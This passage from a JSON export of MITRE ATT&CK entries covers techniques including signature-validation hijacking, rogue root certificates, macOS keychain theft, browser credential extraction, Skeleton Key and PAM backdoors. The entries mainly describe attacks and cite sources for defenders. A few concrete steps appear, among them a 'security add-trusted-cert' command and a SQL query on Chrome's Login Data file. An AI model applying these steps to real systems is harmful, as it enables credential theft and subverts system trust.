omitted -->Dll<!-- raw HTML omitted --> and <!-- raw HTML omitted -->FuncName<!-- raw HTML omitted --> Registry values in <!-- raw HTML omitted -->HKLM\\SOFTWARE[\\WOW6432Node]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllGetSignedDataMsg{SIP_GUID}<!-- raw HTML omitted --> that point to the dynamic link library (DLL) providing a SIP’s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file. By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value (ex: a Microsoft signature for Portable Executables) rather than the file’s real signature, an adversary can apply an acceptable signature value to all files using that SIP (Citation: GitHub SIP POC Sept 2017) (although a hash mismatch will likely occur, invalidating the signature, since the hash returned by the function will not match the value computed from the file).<!-- raw HTML omitted -->* Modifying the <!-- raw HTML omitted -->Dll<!-- raw HTML omitted --> and <!-- raw HTML omitted -->FuncName<!-- raw HTML omitted --> Registry values in <!-- raw HTML omitted -->HKLM\\SOFTWARE[WOW6432Node]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData{SIP_GUID}<!-- raw HTML omitted --> that point to the DLL providing a SIP’s CryptSIPDllVerifyIndirectData function, which validates a file’s computed hash against the signed hash value. By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE (indicating that the validation was successful), an adversary can successfully validate any file (with a legitimate signature) using that SIP (Citation: GitHub SIP POC Sept 2017) (with or without hijacking the previously mentioned CryptSIPDllGetSignedDataMsg function). This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk.<!-- raw HTML omitted -->* Modifying the <!-- raw HTML omitted -->DLL<!-- raw HTML omitted --> and <!-- raw HTML omitted -->Function<!-- raw HTML omitted --> Registry values in <!-- raw HTML omitted -->HKLM\\SOFTWARE[WOW6432Node]Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy{trust provider GUID}<!-- raw HTML omitted --> that point to the DLL providing a trust provider’s FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made. Similar to hijacking SIP’s CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex).<!-- raw HTML omitted -->* <strong>Note:</strong> The above hijacks are also possible without modifying the Registry via <a href=\"https://attack.mitre.org/techniques/T1038\">DLL Search Order Hijacking</a>.<!-- raw HTML omitted --><!-- raw HTML omitted -->Hijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation. (Citation: SpectorOps Subverting Trust Sept 2017)</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft Authenticode",
        "url": "https://msdn.microsoft.com/library/ms537359.aspx",
        "description": "Microsoft. (n.d.). Authenticode. Retrieved January 31, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft WinVerifyTrust",
        "url": "https://msdn.microsoft.com/library/windows/desktop/aa388208.aspx",
        "description": "Microsoft. (n.d.). WinVerifyTrust function. Retrieved January 31, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "SpectorOps Subverting Trust Sept 2017",
        "url": "https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf",
        "description": "Graeber, M. (2017, September). Subverting Trust in Windows. Retrieved January 31, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "EduardosBlog SIPs July 2008",
        "url": "https://blogs.technet.microsoft.com/eduardonavarro/2008/07/11/sips-subject-interface-package-and-authenticode/",
        "description": "Navarro, E. (2008, July 11). SIP’s (Subject Interface Package) and Authenticode. Retrieved January 31, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Catalog Files and Signatures April 2017",
        "url": "https://docs.microsoft.com/windows-hardware/drivers/install/catalog-files",
        "description": "Hudek, T. (2017, April 20). Catalog Files and Digital Signatures. Retrieved January 31, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "GitHub SIP POC Sept 2017",
        "url": "https://github.com/mattifestation/PoCSubjectInterfacePackage",
        "description": "Graeber, M. (2017, September 14). PoCSubjectInterfacePackage. Retrieved January 31, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Entrust Enable CAPI2 Aug 2017",
        "url": "http://www.entrust.net/knowledge-base/technote.cfm?tn=8165",
        "description": "Entrust Datacard. (2017, August 16). How do I enable CAPI 2.0 logging in Windows Vista, Windows 7 and Windows 2008 Server?. Retrieved January 31, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Registry Auditing Aug 2016",
        "url": "https://docs.microsoft.com/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn311461(v=ws.11)",
        "description": "Microsoft. (2016, August 31). Registry (Global Object Access Auditing). Retrieved January 31, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Audit Registry July 2012",
        "url": "https://docs.microsoft.com/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd941614(v=ws.10)",
        "description": "Microsoft. (2012, July 2). Audit Registry. Retrieved January 31, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--c615231b-f253-4f58-9d47-d5b4cbdb6839",
    "platform": "linux|macos|windows",
    "tid": "T1553.004",
    "technique": "Install Root Certificate",
    "tactic": "defense-evasion",
    "datasources": "digital-certificate-logs|ssl-tls-inspection",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers. Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root’s chain of trust that have been signed by the root certificate. (Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.<!-- raw HTML omitted --><!-- raw HTML omitted -->Installation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials. (Citation: Operation Emmental)<!-- raw HTML omitted --><!-- raw HTML omitted -->Atypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide a man-in-the-middle capability for intercepting information transmitted over secure TLS/SSL communications. (Citation: Kaspersky Superfish)<!-- raw HTML omitted --><!-- raw HTML omitted -->Root certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence. (Citation: SpectorOps Code Signing Dec 2017)<!-- raw HTML omitted --><!-- raw HTML omitted -->In macOS, the Ay MaMi malware uses <!-- raw HTML omitted -->/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert<!-- raw HTML omitted --> to install a malicious certificate as a trusted root certificate into the system keychain. (Citation: objective-see ay mami 2018)</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/479.html",
        "description": "none",
        "external_id": "CAPEC-479"
      },
      {
        "source_name": "Wikipedia Root Certificate",
        "url": "https://en.wikipedia.org/wiki/Root_certificate",
        "description": "Wikipedia. (2016, December 6). Root certificate. Retrieved February 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Operation Emmental",
        "url": "http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp-finding-holes-operation-emmental.pdf",
        "description": "Sancho, D., Hacquebord, F., Link, R. (2014, July 22). Finding Holes Operation Emmental. Retrieved February 9, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Kaspersky Superfish",
        "url": "https://www.kaspersky.com/blog/lenovo-pc-with-adware-superfish-preinstalled/7712/",
        "description": "Onuma. (2015, February 24). Superfish: Adware Preinstalled on Lenovo Laptops. Retrieved February 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "SpectorOps Code Signing Dec 2017",
        "url": "https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec",
        "description": "Graeber, M. (2017, December 22). Code Signing Certificate Cloning Attacks and Defenses. Retrieved April 3, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "objective-see ay mami 2018",
        "url": "https://objective-see.com/blog/blog_0x26.html",
        "description": "Patrick Wardle. (2018, January 11). Ay MaMi. Retrieved March 19, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Sigcheck May 2017",
        "url": "https://docs.microsoft.com/sysinternals/downloads/sigcheck",
        "description": "Russinovich, M. et al.. (2017, May 22). Sigcheck. Retrieved April 3, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Tripwire AppUNBlocker",
        "url": "https://www.tripwire.com/state-of-security/off-topic/appunblocker-bypassing-applocker/",
        "description": "Smith, T. (2016, October 27). AppUNBlocker: Bypassing AppLocker. Retrieved December 19, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--1eaebf46-e361-4437-bc23-d5d65a3b92e3",
    "platform": "macos",
    "tid": "T1555.001",
    "technique": "Keychain",
    "tactic": "credential-access",
    "datasources": "api-monitoring|file-monitoring|powershell-logs|process-monitoring|system-calls",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may collect the keychain storage data from a system to acquire credentials. Keychains are the built-in way for macOS to keep track of users’ passwords and credentials for many services and features such as WiFi passwords, websites, secure notes, certificates, and Kerberos. Keychain files are located in <!-- raw HTML omitted -->~/Library/Keychains/<!-- raw HTML omitted -->,<!-- raw HTML omitted -->/Library/Keychains/<!-- raw HTML omitted -->, and <!-- raw HTML omitted -->/Network/Library/Keychains/<!-- raw HTML omitted -->. (Citation: Wikipedia keychain) The <!-- raw HTML omitted -->security<!-- raw HTML omitted --> command-line utility, which is built into macOS by default, provides a useful way to manage these credentials.<!-- raw HTML omitted --><!-- raw HTML omitted -->To manage their credentials, users have to use additional credentials to access their keychain. If an adversary knows the credentials for the login keychain, then they can get access to all the other credentials stored in this vault. (Citation: External to DA, the OS X Way) By default, the passphrase for the keychain is the user’s logon credentials.</p>\n",
    "technique_references": [
      {
        "source_name": "Wikipedia keychain",
        "url": "https://en.wikipedia.org/wiki/Keychain_(software)",
        "description": "Wikipedia. (n.d.). Keychain (software). Retrieved July 5, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "External to DA, the OS X Way",
        "url": "http://www.slideshare.net/StephanBorosh/external-to-da-the-os-x-way",
        "description": "Alex Rymdeko-Harvey, Steve Borosh. (2016, May 14). External to DA, the OS X Way. Retrieved July 3, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--1a80d097-54df-41d8-9d33-34e755ec5e72",
    "platform": "linux|macos",
    "tid": "T1555.002",
    "technique": "Securityd Memory",
    "tactic": "credential-access",
    "datasources": "process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>An adversary may obtain root access (allowing them to read securityd’s memory), then they can scan through memory to find the correct sequence of keys in relatively few tries to decrypt the user’s logon keychain. This provides the adversary with all the plaintext passwords for users, WiFi, mail, browsers, certificates, secure notes, etc.(Citation: OS X Keychain) (Citation: OSX Keydnap malware)<!-- raw HTML omitted --><!-- raw HTML omitted -->In OS X prior to El Capitan, users with root access can read plaintext keychain passwords of logged-in users because Apple’s keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords. (Citation: OS X Keychain) (Citation: External to DA, the OS X Way) Apple’s securityd utility takes the user’s logon password, encrypts it with PBKDF2, and stores this master key in memory. Apple also uses a set of keys and algorithms to encrypt the user’s password, but once the master key is found, an attacker need only iterate over the other values to unlock the final password.(Citation: OS X Keychain)</p>\n",
    "technique_references": [
      {
        "source_name": "OS X Keychain",
        "url": "http://juusosalonen.com/post/30923743427/breaking-into-the-os-x-keychain",
        "description": "Juuso Salonen. (2012, September 5). Breaking into the OS X keychain. Retrieved July 15, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "OSX Keydnap malware",
        "url": "https://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-hungry-credentials/",
        "description": "Marc-Etienne M.Leveille. (2016, July 6). New OSX/Keydnap malware is hungry for credentials. Retrieved July 3, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "External to DA, the OS X Way",
        "url": "http://www.slideshare.net/StephanBorosh/external-to-da-the-os-x-way",
        "description": "Alex Rymdeko-Harvey, Steve Borosh. (2016, May 14). External to DA, the OS X Way. Retrieved July 3, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--58a3e6aa-4453-4cc8-a51f-4befe80b31a8",
    "platform": "linux|macos|windows",
    "tid": "T1555.003",
    "technique": "Credentials from Web Browsers",
    "tactic": "credential-access",
    "datasources": "api-monitoring|file-monitoring|powershell-logs|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may acquire credentials from web browsers by reading files specific to the target browser.(Citation: Talos Olympic Destroyer 2018) Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.<!-- raw HTML omitted --><!-- raw HTML omitted -->For example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, <!-- raw HTML omitted -->AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data<!-- raw HTML omitted --> and executing a SQL query: <!-- raw HTML omitted -->SELECT action_url, username_value, password_value FROM logins;<!-- raw HTML omitted -->. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function <!-- raw HTML omitted -->CryptUnprotectData<!-- raw HTML omitted -->, which uses the victim’s cached logon credentials as the decryption key. (Citation: Microsoft CryptUnprotectData ‎April 2018)<!-- raw HTML omitted --> <!-- raw HTML omitted -->Adversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc. (Citation: Proofpoint Vega Credential Stealer May 2018)(Citation: FireEye HawkEye Malware July 2017)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.(Citation: GitHub Mimikittenz July 2016)<!-- raw HTML omitted --><!-- raw HTML omitted -->After acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary’s objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).</p>\n",
    "technique_references": [
      {
        "source_name": "Talos Olympic Destroyer 2018",
        "url": "https://blog.talosintelligence.com/2018/02/olympic-destroyer.html",
        "description": "Mercer, W. and Rascagneres, P. (2018, February 12). Olympic Destroyer Takes Aim At Winter Olympics. Retrieved March 14, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft CryptUnprotectData ‎April 2018",
        "url": "https://docs.microsoft.com/en-us/windows/desktop/api/dpapi/nf-dpapi-cryptunprotectdata",
        "description": "Microsoft. (2018, April 12). CryptUnprotectData function. Retrieved June 18, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Proofpoint Vega Credential Stealer May 2018",
        "url": "https://www.proofpoint.com/us/threat-insight/post/new-vega-stealer-shines-brightly-targeted-campaign",
        "description": "Proofpoint. (2018, May 10). New Vega Stealer shines brightly in targeted campaign . Retrieved June 18, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye HawkEye Malware July 2017",
        "url": "https://www.fireeye.com/blog/threat-research/2017/07/hawkeye-malware-distributed-in-phishing-campaign.html",
        "description": "Swapnil Patil, Yogesh Londhe. (2017, July 25). HawkEye Credential Theft Malware Distributed in Recent Phishing Campaign. Retrieved June 18, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "GitHub Mimikittenz July 2016",
        "url": "https://github.com/putterpanda/mimikittenz",
        "description": "Jamieson O'Reilly (putterpanda). (2016, July 4). mimikittenz. Retrieved June 20, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--d4b96d2c-1032-4b22-9235-2b5b649d0605",
    "platform": "windows",
    "tid": "T1556.001",
    "technique": "Domain Controller Authentication",
    "tactic": "credential-access",
    "datasources": "api-monitoring|authentication-logs|dll-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may patch the authentication process on a domain controller to bypass the typical authentication mechanisms and enable access to accounts. <!-- raw HTML omitted --><!-- raw HTML omitted -->Malware may be used to inject false credentials into the authentication process on a domain controller with the intent of creating a backdoor used to access any user’s account and/or credentials (ex: <a href=\"https://attack.mitre.org/software/S0007\">Skeleton Key</a>). Skeleton key works through a patch on an enterprise domain controller authentication process (LSASS) with credentials that adversaries may use to bypass the standard authentication system. Once patched, an adversary can use the injected password to successfully authenticate as any domain user account (until the the skeleton key is erased from memory by a reboot of the domain controller). Authenticated access may enable unfettered access to hosts and/or resources within single-factor authentication environments.(Citation: Dell Skeleton)</p>\n",
    "technique_references": [
      {
        "source_name": "Dell Skeleton",
        "url": "https://www.secureworks.com/research/skeleton-key-malware-analysis",
        "description": "Dell SecureWorks. (2015, January 12). Skeleton Key Malware Analysis. Retrieved April 8, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Audit Policy",
        "url": "https://technet.microsoft.com/en-us/library/dn487457.aspx",
        "description": "Microsoft. (2016, April 15). Audit Policy Recommendations. Retrieved June 3, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--d4b96d2c-1032-4b22-9235-2b5b649d0605",
    "platform": "windows",
    "tid": "T1556.001",
    "technique": "Domain Controller Authentication",
    "tactic": "defense-evasion",
    "datasources": "api-monitoring|authentication-logs|dll-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may patch the authentication process on a domain controller to bypass the typical authentication mechanisms and enable access to accounts. <!-- raw HTML omitted --><!-- raw HTML omitted -->Malware may be used to inject false credentials into the authentication process on a domain controller with the intent of creating a backdoor used to access any user’s account and/or credentials (ex: <a href=\"https://attack.mitre.org/software/S0007\">Skeleton Key</a>). Skeleton key works through a patch on an enterprise domain controller authentication process (LSASS) with credentials that adversaries may use to bypass the standard authentication system. Once patched, an adversary can use the injected password to successfully authenticate as any domain user account (until the the skeleton key is erased from memory by a reboot of the domain controller). Authenticated access may enable unfettered access to hosts and/or resources within single-factor authentication environments.(Citation: Dell Skeleton)</p>\n",
    "technique_references": [
      {
        "source_name": "Dell Skeleton",
        "url": "https://www.secureworks.com/research/skeleton-key-malware-analysis",
        "description": "Dell SecureWorks. (2015, January 12). Skeleton Key Malware Analysis. Retrieved April 8, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Audit Policy",
        "url": "https://technet.microsoft.com/en-us/library/dn487457.aspx",
        "description": "Microsoft. (2016, April 15). Audit Policy Recommendations. Retrieved June 3, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--3731fbcd-0e43-47ae-ae6c-d15e510f0d42",
    "platform": "windows",
    "tid": "T1556.002",
    "technique": "Password Filter DLL",
    "tactic": "credential-access",
    "datasources": "dll-monitoring|file-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated. <!-- raw HTML omitted --><!-- raw HTML omitted -->Windows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as DLLs containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts. Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation. <!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made.(Citation: Carnal Ownage Password Filters Sept 2013)</p>\n",
    "technique_references": [
      {
        "source_name": "Carnal Ownage Password Filters Sept 2013",
        "url": "http://carnal0wnage.attackresearch.com/2013/09/stealing-passwords-every-time-they.html",
        "description": "Fuller, R. (2013, September 11). Stealing passwords every time they change. Retrieved November 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Clymb3r Function Hook Passwords Sept 2013",
        "url": "https://clymb3r.wordpress.com/2013/09/15/intercepting-password-changes-with-function-hooking/",
        "description": "Bialek, J. (2013, September 15). Intercepting Password Changes With Function Hooking. Retrieved November 21, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--3731fbcd-0e43-47ae-ae6c-d15e510f0d42",
    "platform": "windows",
    "tid": "T1556.002",
    "technique": "Password Filter DLL",
    "tactic": "defense-evasion",
    "datasources": "dll-monitoring|file-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated. <!-- raw HTML omitted --><!-- raw HTML omitted -->Windows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as DLLs containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts. Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation. <!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made.(Citation: Carnal Ownage Password Filters Sept 2013)</p>\n",
    "technique_references": [
      {
        "source_name": "Carnal Ownage Password Filters Sept 2013",
        "url": "http://carnal0wnage.attackresearch.com/2013/09/stealing-passwords-every-time-they.html",
        "description": "Fuller, R. (2013, September 11). Stealing passwords every time they change. Retrieved November 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Clymb3r Function Hook Passwords Sept 2013",
        "url": "https://clymb3r.wordpress.com/2013/09/15/intercepting-password-changes-with-function-hooking/",
        "description": "Bialek, J. (2013, September 15). Intercepting Password Changes With Function Hooking. Retrieved November 21, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--06c00069-771a-4d57-8ef5-d3718c1a8771",
    "platform": "linux|macos",
    "tid": "T1556.003",
    "technique": "Pluggable Authentication Modules",
    "tactic": "credential-access",
    "datasources": "authentication-logs|file-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is <!-- raw HTML omitted -->pam_unix.so<!-- raw HTML omitted -->, which retrieves, sets, and verifies account authentication information in <!-- raw HTML omitted -->/etc/passwd<!-- raw HTML omitted --> and <!-- raw HTML omitted -->/etc/shadow<!-- raw HTML omitted -->.(Citation: Apple PAM)(Citation: Man Pam_Unix)(Citation: Red Hat PAM)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may modify components of the PAM system to create backdoors. PAM components, such as <!-- raw HTML omitted -->pam_unix.so<!-- raw HTML omitted -->, can be patched to accept arbitrary adversary supplied values as legitimate credentials.(Citation: PAM Backdoor)<!-- raw HTML omitted --><!-- raw HTML omitted -->Malicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.(Citation: PAM Creds)(Citation: Apple PAM)</p>\n",
    "technique_references": [
      {
        "source_name": "Apple PAM",
        "url": "https://opensource.apple.com/source/dovecot/dovecot-239/dovecot/doc/wiki/PasswordDatabase.PAM.txt",
        "description": "Apple. (2011, May 11). PAM - Pluggable Authentication Modules. Retrieved June 25, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Man Pam_Unix",
        "url": "https://linux.die.net/man/8/pam_unix",
        "description": "die.net. (n.d.). pam_unix(8) - Linux man page. Retrieved June 25, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Red Hat PAM",
        "url": "https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/managing_smart_cards/pluggable_authentication_modules",
        "description": "Red Hat. (n.d.). CHAPTER 2. USING PLUGGABLE AUTHENTICATION MODULES (PAM). Retrieved June 25, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "PAM Backdoor",
        "url": "https://github.com/zephrax/linux-pam-backdoor",
        "description": "zephrax. (2018, August 3). linux-pam-backdoor. Retrieved June 25, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "PAM Creds",
        "url": "https://x-c3ll.github.io/posts/PAM-backdoor-DNS/",
        "description": "Fernández, J. M. (2018, June 27). Exfiltrating credentials via PAM backdoors & DNS requests. Retrieved June 26, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--06c00069-771a-4d57-8ef5-d3718c1a8771",
    "platform": "linux|macos",
    "tid": "T1556.003",
    "technique": "Pluggable Authentication Modules",
    "tactic": "defense-evasion",
    "datasources": "authentication-logs|file-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is <!-- raw HTML omitted -->pam_unix.so<!-- raw HTML omitted -->, which retrieves, sets, and verifies account authentication information in <!-- raw HTML omitted -->/etc/passwd<!-- raw HTML omitted --> and <!-- raw HTML omitted -->/etc/shadow<!-- raw HTML omitted -->.(Citation: Apple PAM)(Citation: Man Pam_Unix)(Citation: Red Hat PAM)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may modify components of the PAM system to create backdoors. PAM components, such as <!-- raw HTML omitted -->pam_unix.so<!-- raw HTML omitted -->, can be patched to accept arbitrary adversary supplied values as legitimate credentials.(Citation: PAM Backdoor)<!-- raw HTML omitted --><!-- raw HTML omitted -->Malicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.(Citation: PAM Creds)(Citation: Apple PAM)</p>\n",
    "technique_references": [
      {
        "source_name": "Apple PAM",
        "url": "https://opensource.apple.com/source/dovecot/dovecot-239/dovecot/doc/wiki/PasswordDatabase.PAM.txt",
        "description": "Apple. (2011, May 11). PAM - Pluggable Authentication Modules. Retrieved June 25, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Man Pam_Unix",
        "url": "https://linux.die.net/man/8/pam_unix",
        "description": "die.net. (n.d.). pam_unix(8) - Linux man page. Retrieved June 25, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Red Hat PAM",
        "url": "https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/managing_smart_cards/pluggable_authentication_modules",
        "description": "Red Hat. (n.d.). CHAPTER 2. USING PLUGGABLE AUTHENTICATION MODULES (PAM). Retrieved June 25, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "PAM Backdoor",
        "url": "https://github.com/zephrax/linux-pam-backdoor",
        "description": "zephrax. (2018, August 3). linux-pam-backdoor. Retrieved June 25, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "PAM Creds",
        "url": "https://x-c3ll.github.io/posts/PAM-backdoor-DNS/",
        "description": "Fernández, J. M. (2018, June 27). Exfiltrating credentials via PAM backdoors & DNS requests. Retrieved June 26, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--fa44a152-ac48-441e-a524-dd7b04b8adcd",
    "platform": "network",
    "tid": "T1556.004",
    "technique": "Network Device Authentication",
    "tactic": "credential-access",
    "datasources": "file-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
